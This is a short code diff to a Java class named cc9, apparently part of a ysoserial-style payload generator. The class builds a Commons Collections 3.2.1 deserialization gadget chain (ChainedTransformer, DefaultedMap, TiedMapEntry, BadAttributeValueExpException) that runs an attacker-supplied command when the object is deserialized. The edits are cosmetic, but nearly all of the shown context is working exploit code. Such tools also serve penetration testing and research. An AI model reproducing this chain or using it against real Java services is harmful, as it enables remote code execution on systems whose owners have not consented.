@@ -14,6 +14,7 @@ import javax.management.BadAttributeValueExpException;
 import java.util.HashMap;
 import java.util.Map;
 
+@SuppressWarnings({"rawtypes", "unused"})
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
 @Authors({"梅子酒"})
 
@@ -21,9 +22,9 @@ public class cc9 implements ObjectPayload<BadAttributeValueExpException> {
 
     public BadAttributeValueExpException getObject(String command) throws Exception {
 
-        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Integer.valueOf(1))});
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
         Transformer[] transformers = TransformerUtil.makeTransformer(command);
-        Map<Object, Object> innerMap = new HashMap<Object, Object>();
+        Map<Object, Object> innerMap = new HashMap<>();
         Map defaultedmap = DefaultedMap.decorate(innerMap, chainedTransformer);
         TiedMapEntry entry = new TiedMapEntry(defaultedmap, "QI4L");
         BadAttributeValueExpException val = new BadAttributeValueExpException(null);
